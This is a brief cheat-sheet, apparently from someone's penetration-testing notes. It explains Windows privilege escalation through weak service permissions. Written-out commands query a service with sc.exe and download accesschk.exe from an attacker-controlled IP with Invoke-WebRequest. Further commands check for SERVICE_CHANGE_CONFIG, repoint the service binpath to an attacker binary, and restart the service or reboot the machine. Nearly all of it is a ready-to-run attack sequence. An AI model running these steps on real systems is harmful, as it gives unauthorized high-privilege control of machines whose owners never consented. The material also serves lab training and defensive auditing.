First, get base info of the service:
```
sc.exe qc SERVICE
```

If the service is running at high authority, check the user's priveleges:
```
Invoke-WebRequest http://IP/accesschk.exe -o accesschk.exe
./accesschk.exe /accepteula -ucvwq USERNAME SERVICE 
```

If you have `SERVICE_CHANGE_CONFIG`, change the binary path as following:
```
sc.exe config SERVICE binpath=\`"C:\PATH\`" // Only works in Powershell
sc config daclsvc binpath= "\"C:\PATH\""    // Only works in CMD
```

Restart the service:
```
net stop SERVICE
net start SERVICE
```
Note: if `net start`/`net stop` cannot be called, reboot the system.
